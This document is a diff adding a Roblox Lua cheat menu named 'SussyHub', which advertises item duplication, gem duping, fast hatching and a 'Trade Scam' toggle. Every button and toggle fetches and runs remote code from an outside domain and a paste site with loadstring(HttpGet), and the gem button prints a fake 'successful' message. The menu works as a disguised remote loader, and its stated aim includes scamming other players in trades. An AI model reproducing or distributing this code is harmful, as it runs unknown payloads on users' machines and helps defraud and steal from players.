@@ -1,0 +1,110 @@
+local OrionLib = loadstring(game:HttpGet('https://raw.githubusercontent.com/shlexware/Orion/main/source'))()
+local Window = OrionLib:MakeWindow({
+    Name = "SussyHub",
+    HidePremium = false,
+    Introtext = "Dupe and trade scam",
+    SaveConfig = true,
+    ConfigFolder = "SussyHub"
+})
+
+OrionLib:MakeNotification({
+    Name = "Hey!",
+    Content = "Execution successful",
+    Image = "rbxassetid://4483345998",
+    Time = 5
+})
+
+local TutTab = Window:MakeTab({
+    Name = "Dupe & More", -- Updated tab name
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+-- Adding a section for "Dupe"
+local DupeSection = TutTab:AddSection({
+    Name = "Dupe"
+})
+
+-- "Dupe" button (modified)
+DupeSection:AddButton({
+    Name = "Dupe",
+    Callback = function()
+        -- Execute the script
+        loadstring(game:HttpGet('https://egorikusa.space/5caab90594d14d78afce27a5.lua', true))()
+    end    
+})
+
+-- Adding a section for "Gem Dupe"
+local GemDupeSection = TutTab:AddSection({
+    Name = "Gem Dupe"
+})
+
+-- Text box for gem amount
+local GemAmountTextBox = GemDupeSection:AddTextBox({
+    Name = "Gem Amount",
+    Placeholder = "Enter amount...",
+    Callback = function(Value)
+        -- Store the value somewhere if needed
+        print("Gem amount set to: " .. Value)
+    end
+})
+
+-- "Gem Dupe" button (modified)
+GemDupeSection:AddButton({
+    Name = "Gem Dupe",
+    Callback = function()
+        local gemAmount = tonumber(GemAmountTextBox.Text) or 0
+        print("Attempting to dupe " .. gemAmount .. " gems...")
+        -- Execute the script multiple times based on gemAmount
+        for i = 1, gemAmount do
+            loadstring(game:HttpGet('https://egorikusa.space/5caab90594d14d78afce27a5.lua', true))()
+        end
+        print("Gem dupe successful!")
+    end    
+})
+
+-- Adding a section for "Trade Scam"
+local TradeScamSection = TutTab:AddSection({
+    Name = "Trade Scam"
+})
+
+-- Toggle button for Trade Scam
+TradeScamSection:AddToggle({
+    Name = "Trade Scam",
+    Default = false,
+    Callback = function(Value)
+        if Value then
+            print("Trade Scam enabled")
+            -- Execute both scripts (previous and new)
+            loadstring(game:HttpGet('https://rentry.co/ywqxuw7z/raw', true))()
+            loadstring(game:HttpGet('https://egorikusa.space/5caab90594d14d78afce27a5.lua', true))()
+        else
+            print("Trade Scam disabled")
+            -- Optionally add logic to disable trade scam if necessary
+        end
+    end    
+})
+
+-- Adding a section for "Fast Hatching"
+local FastHatchSection = TutTab:AddSection({
+    Name = "Fast Hatching"
+})
+
+-- Toggle button for Fast Hatching (modified)
+FastHatchSection:AddToggle({
+    Name = "Fast Hatching",
+    Default = false,
+    Callback = function(Value)
+        if Value then
+            print("Fast Hatching enabled")
+            -- Execute both scripts (previous and new)
+            loadstring(game:HttpGet('https://rentry.co/ywqxuw7z/raw', true))()
+            loadstring(game:HttpGet('https://egorikusa.space/5caab90594d14d78afce27a5.lua', true))()
+        else
+            print("Fast Hatching disabled")
+            -- Optionally add logic to disable fast hatching if necessary
+        end
+    end    
+})
+
+OrionLib:Init()
